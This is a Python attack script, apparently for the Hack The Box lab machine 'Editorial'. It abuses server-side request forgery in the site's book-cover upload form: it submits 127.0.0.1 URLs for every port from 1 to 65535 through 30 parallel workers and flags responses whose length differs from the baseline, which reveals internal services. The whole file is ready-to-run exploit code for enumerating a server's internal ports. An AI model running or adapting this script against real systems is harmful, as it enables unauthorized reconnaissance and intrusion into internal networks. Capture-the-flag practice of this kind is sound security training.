#!/usr/bin/python3
import requests
from multiprocessing import Pool

burp0_url = "http://editorial.htb/upload-cover"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "multipart/form-data; boundary=---------------------------1575085794932368148323839479",
    "Origin": "http://editorial.htb",
    "DNT": "1",
    "Connection": "close",
    "Referer": "http://editorial.htb/upload"
}
exclude_length = 61

def check_port(port):
    burp0_data = (
        f"-----------------------------1575085794932368148323839479\r\n"
        f"Content-Disposition: form-data; name=\"bookurl\"\r\n\r\n"
        f"http://127.0.0.1:{port}\r\n"
        f"-----------------------------1575085794932368148323839479\r\n"
        f"Content-Disposition: form-data; name=\"bookfile\"; filename=\"\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n\r\n"
        f"-----------------------------1575085794932368148323839479--\r\n"
    )
    
    try:
        r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, timeout=30)
        if 'Content-Length' in r.headers:
            size = int(r.headers['Content-Length'])
        else:
            size = len(r.content)
        
        if size != exclude_length:
            print(f"[+] Port {port} returns size {size} (different from average size {exclude_length})")
    except requests.exceptions.RequestException as e:
        print(f"[-] Port {port} raised an exception: {e}")

if __name__ == "__main__":
    with Pool(processes=30) as pool:
        pool.map(check_port, range(1, 65536))
